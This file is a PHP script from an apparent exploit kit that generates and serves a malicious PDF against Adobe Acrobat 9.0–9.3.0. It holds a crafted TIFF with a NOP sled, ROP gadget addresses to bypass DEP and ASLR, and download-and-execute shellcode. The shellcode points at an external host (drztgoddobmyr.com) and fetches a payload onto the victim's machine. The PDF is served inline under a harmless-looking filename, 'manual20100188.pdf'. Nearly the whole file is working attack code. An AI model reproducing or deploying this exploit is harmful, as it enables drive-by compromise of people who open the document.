<?php
#windows all DEP + ASLR bypass; Adobe acrobat 9.0 - 9.3.0


include_once('config.php');
include("include/util.php");
include("include/shellcode.php");

function generate_tiff($url){
		
		$shellcode_offset = 300;
		$tiff_offset = 0x2038;
		
		$shellcode = shellcode_dl_exec($url);
		
		$tiff =  "\x4D\x4D"; # big endian
		$tiff = $tiff . "\x00\x2A"; #tiff version 42
		
		$tiff = $tiff . pack("N", $tiff_offset); # offset to IFD

		$tiff = $tiff . str_repeat("\x0c\x90", ($shellcode_offset/2));
		$tiff = $tiff . $shellcode;
		$tiff = $tiff . str_repeat("\x3e", ($tiff_offset - 8 - strlen($shellcode) - $shellcode_offset));

		#tiff data 
				
		$tiff = $tiff . "\x00\x07"; #number of entries
		
		# IFD
				
		$tiff = $tiff . "\x01\x00"; # tag
		$tiff = $tiff . "\x00\x03"; # type
		$tiff = $tiff . "\x00\x00\x00\x01"; # count
		$tiff = $tiff . "\x00\x00\x20\x30"; # value
		
		$tiff = $tiff . "\x01\x01";	
		$tiff = $tiff . "\x00\x03";
		$tiff = $tiff . "\x00\x00\x00\x01";
		$tiff = $tiff . "\x00\x00\x01\x01";
		
		$tiff = $tiff . "\x01\x03";
		$tiff = $tiff . "\x00\x03";
		$tiff = $tiff . "\x00\x00\x00\x01";
		$tiff = $tiff . "\x00\x00\x00\x01";
		
		$tiff = $tiff . "\x01\x06";
		$tiff = $tiff . "\x00\x03";
		$tiff = $tiff . "\x00\x00\x00\x01";
		$tiff = $tiff . "\x00\x00\x00\x01";
		
		$tiff = $tiff . "\x01\x11";
		$tiff = $tiff . "\x00\x04";
		$tiff = $tiff . "\x00\x00\x00\x01";
		$tiff = $tiff . "\x00\x00\x00\x08";
			
		$tiff = $tiff . "\x01\x17";
		$tiff = $tiff . "\x00\x04";
		$tiff = $tiff . "\x00\x00\x00\x01";
		$tiff = $tiff . "\x00\x00\x20\x30";
		
		//$tiff = $tiff . "\x02\x12";
		$tiff = $tiff . "\x01\x41";
		$tiff = $tiff . "\x00\x03";
		$tiff = $tiff . "\x00\x00\x00\xCC";
		$tiff = $tiff . "\x00\x00\x20\x92";
						
		$tiff = $tiff . "\x00\x00\x00\x00";
		$tiff = $tiff . "\x08\x0C\x0C\x00";
		$tiff = $tiff . "\x24\x01\x01\x00";
		
		#stack data - do not change
		
		$tiff = $tiff . "\x90\x1F\x80\x4A\x3C\x90\x84\x4A\x92\xB6\x80\x4A\x64\x10\x80\x4A";
		$tiff = $tiff . "\x08\x87\x85\x4A\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00";
		$tiff = $tiff . "\x02\x00\x00\x00\x02\x01\x00\x00\x00\x00\x00\x00\xA5\x63\x80\x4A";
		$tiff = $tiff . "\x64\x10\x80\x4A\xB2\x2D\x84\x4A\xB1\x2A\x80\x4A\x08\x00\x00\x00";
		$tiff = $tiff . "\xA6\xA8\x80\x4A\x90\x1F\x80\x4A\x38\x90\x84\x4A\x92\xB6\x80\x4A";
		$tiff = $tiff . "\x64\x10\x80\x4A\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x40\x00\x00\x00";
		$tiff = $tiff . "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\xA5\x63\x80\x4A";
		$tiff = $tiff . "\x64\x10\x80\x4A\xB2\x2D\x84\x4A\xB1\x2A\x80\x4A\x08\x00\x00\x00";
		$tiff = $tiff . "\xA6\xA8\x80\x4A\x90\x1F\x80\x4A\x30\x90\x84\x4A\x92\xB6\x80\x4A";
		$tiff = $tiff . "\x64\x10\x80\x4A\xFF\xFF\xFF\xFF\x22\x00\x00\x00\x00\x00\x00\x00";
		$tiff = $tiff . "\x00\x00\x00\x00\x00\x00\x01\x00";
		

		//$tiff = $tiff . "\xA5\x63\x80\x4A";
		//$tiff = $tiff . "\x04\x00\x8A\x4A";
		//$tiff = $tiff . "\x96\x21\x80\x4A";
				
		//$tiff = $tiff . "\x24\x85\x84\x4A";

		//$tiff = $tiff . "\x5A\x52\x6A\x43";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";				
		//$tiff = $tiff . "\x24\x85\x84\x4A";

		//$tiff = $tiff . "\x58\xb9\x00\x03";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";		
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\xfe\x7f\xff\x11";

		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";		
		
		//$tiff = $tiff . "\x3C\x05\x5A\x75";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\xEF\xB8\x4D\x4D";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\x00\x2A\x8B\xFA";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";		
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\xAF\x75\xE5\x87";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\xFE\xEB\x0A\x5F";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\xB9\xE0\x03\x00";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\x00\xF3\xA5\xEB";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\x09\xE8\xF1\xFF";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		//$tiff = $tiff . "\x24\x85\x84\x4A";
		
		//$tiff = $tiff . "\xFF\xFF\x90\x90";
		
		//$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\xC0\xB6\x81\x4A";
		////$tiff = $tiff . "\x24\x85\x84\x4A";
		
		////$tiff = $tiff . "\xFF\xFF\xFF\x90";
		
		////$tiff = $tiff . "\xBB\x07\x82\x4A";
		//$tiff = $tiff . "\x90\x1F\x80\x4A";
		//$tiff = $tiff . "\x04\x00\x8A\x4A";
		//$tiff = $tiff . "\xD8\xA7\x80\x4A";
		//$tiff = $tiff . "\xCA\xEC\x83\x4A";

		
		$tiff = $tiff . "\xA5\x63\x80\x4A";
		$tiff = $tiff . "\x04\x00\x8A\x4A";
		$tiff = $tiff . "\x96\x21\x80\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";

		$tiff = $tiff . "\x5A\x52\x6A\x02";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";		
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\x58\xCD\x2E\x3C";

		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";		
		
		$tiff = $tiff . "\x05\x5A\x74\xF4";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\xB8\x4D\x4D\x00";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\x2A\x8B\xFA\xAF";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";		
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\x75\xEA\x87\xFE";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\xEB\x0A\x5F\xB9";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\xE0\x03\x00\x00";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\xF3\xA5\xEB\x09";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\xE8\xF1\xFF\xFF";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\xFF\x90\x90\x90";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\xC0\xB6\x81\x4A";
		$tiff = $tiff . "\x24\x85\x84\x4A";
		
		$tiff = $tiff . "\xFF\xFF\xFF\x90";
		
		$tiff = $tiff . "\xBB\x07\x82\x4A";
		$tiff = $tiff . "\x90\x1F\x80\x4A";
		$tiff = $tiff . "\x04\x00\x8A\x4A";
		$tiff = $tiff . "\xD8\xA7\x80\x4A";
		$tiff = $tiff . "\xCA\xEC\x83\x4A";
		
		return $tiff;	
}

function generate_xml($url){
	
	$tiff = base64_encode(generate_tiff($url));
	
	$xml = '<?xml version="1.0" encoding="UTF-8" ?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/1.0/">
<present>
<pdf>
<version>1.65</version>
<interactive>1</interactive>
<linearized>1</linearized>
</pdf>
<xdp>
<packets>*</packets>
</xdp>
<destination>pdf</destination>
</present>
</config>
<template baseProfile="interactiveForms" xmlns="http://www.xfa.org/schema/xfa-template/2.4/">
<subform name="Top" layout="tb" locale="en_US">
<pageSet>
<pageArea id="PageArea1" name="PageArea1">
<contentArea name="ContentArea1" x="0pt" y="0pt" w="612pt" h="792pt" />
<medium short="612pt" long="792pt" stock="custom" />
</pageArea>
</pageSet>
<subform name="Page1" x="0pt" y="0pt" w="612pt" h="792pt">
<break before="pageArea" beforeTarget="#PageArea1" />
<bind match="none" />
<field name="Image" w="28.575mm" h="1.39mm" x="37.883mm" y="29.25mm">
<ui>
<imageEdit />
</ui>
</field>
<?templateDesigner expand 1?>
</subform>
<?templateDesigner expand 1?>
</subform>
<?templateDesigner FormTargetVersion 24?>
<?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?>
<?templateDesigner Zoom 94?>
</template>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
<xfa:data>
<Top>
<Image xfa:contentType="image/tif" href="">' . $tiff . '</Image>
</Top>
</xfa:data>
</xfa:datasets>
<PDFSecurity xmlns="http://ns.adobe.com/xtd/" print="1" printHighQuality="1" change="1" modifyAnnots="1" formFieldFilling="1" documentAssembly="1" contentCopy="1" accessibleContent="1" metadata="1" />
<form xmlns="http://www.xfa.org/schema/xfa-form/2.8/">
<subform name="Top">
<instanceManager name="_Page1" />
<subform name="Page1">
<field name="Image" />
</subform>
<pageSet>
<pageArea name="PageArea1" />
</pageSet>
</subform>
</form>
</xdp:xdp>';
	
	return $xml;
}

function generate_pdf($url){
				
		$xml = pdf_FlateEncode(generate_xml($url));		
		//$xml = pdf_ASCIIHexEncode($xml);
		//$xml = pdf_ASCII85Encode($xml);
		
		$xmllen = strlen($xml);
		
		$eol = "\r\n";
		$endobj = "endobj" . $eol;
		
		$xref = array();
		
		$pdf = "%PDF-1.5" . $eol;
		$pdf = $pdf . "%" . RandomNonASCIIString(4) . $eol;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(1) . "<</Length " . strlen($xml) . "/Filter [/FlateDecode]/Type /EmbeddedFile>>" . $eol;
		$pdf = $pdf . "stream"  . $eol; 
		$pdf = $pdf . $xml  . $eol;
		$pdf = $pdf . $eol . "endstream" . $eol; 
		$pdf = $pdf . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(2) . "<</V () /Kids [" . ioRef(3) . "] /T (" . "Top[0]" . ") >>" . $eol  . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(3) . "<</Parent " . ioRef(2) . " /Kids [" . ioRef(4) . "] /T (Page1[0])>>";
		$pdf = $pdf . $eol . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(4) . "<</MK <</IF <</A [0.0 1.0]>>/TP 1>>/P " . ioRef(5);
		$pdf = $pdf . "/FT /Btn/TU (" . "Image" . ")/Ff 65536/Parent " . ioRef(3);
		$pdf = $pdf . "/F 4/DA (/CourierStd 10 Tf 0 g)/Subtype /Widget/Type /Annot/T (" . "Image[0]" . ")/Rect [107.385 705.147 188.385 709.087]>>";
		$pdf = $pdf . $eol . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(5) . "<</Rotate 0 /CropBox [0.0 0.0 612.0 792.0]/MediaBox [0.0 0.0 612.0 792.0]/Resources <</XObject >>/Parent ";
		$pdf = $pdf . ioRef(6) . "/Type /Page/PieceInfo null>>";
		$pdf = $pdf . $eol . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(6) . "<</Kids [" . ioRef(5) . "]/Type /Pages/Count 1>>";
		$pdf = $pdf . $eol . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(7) . "<</PageMode /UseAttachments/Pages " . ioRef(6);
		$pdf = $pdf . "/MarkInfo <</Marked true>>/Lang (en-us)/AcroForm " . ioRef(8);
		$pdf = $pdf . "/Type /Catalog>>";
		$pdf = $pdf . $eol . $endobj;

		$xref[] = strlen($pdf);
		$pdf = $pdf . ioDef(8) . "<</DA (/Helv 0 Tf 0 g )/XFA [(template) " . ioRef(1) . "]/Fields [";
		$pdf = $pdf . ioRef(2) . "]>>";
		$pdf = $pdf . $endobj  . $eol; 
		
		$xrefPosition = strlen($pdf);
		
		$pdf = $pdf . "xref" . $eol;
		$pdf = $pdf . "0 " . (count($xref) + 1) . $eol;
		$pdf = $pdf . "0000000000 65535 f" . $eol;
		
		for($i = 0; $i < count($xref); $i++){
			$temp = sprintf("%010d 00000 n", $xref[$i]);
			$pdf = $pdf . $temp . $eol;
		}
		
		$pdf = $pdf . "trailer" . "<</Size " . (count($xref) + 1) . "/Root " . ioRef(7) . ">>" . $eol;
		$pdf = $pdf . "startxref" . $eol;
		$pdf = $pdf . $xrefPosition . $eol;
		$pdf = $pdf . "%%EOF";
		
		return $pdf;
}
$pdf = generate_pdf("http://drztgoddobmyr.com/555/ble/download_file.php?e=Adobe-90-2010-0188");

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");
header("Accept-Ranges: bytes\r\n");
header("Content-Length: " . strlen($pdf) . "\r\n");
header("Content-Disposition: inline; filename=manual20100188.pdf");
header("\r\n");
header("Content-Type: application/pdf\r\n\r\n");
echo $pdf;
?>
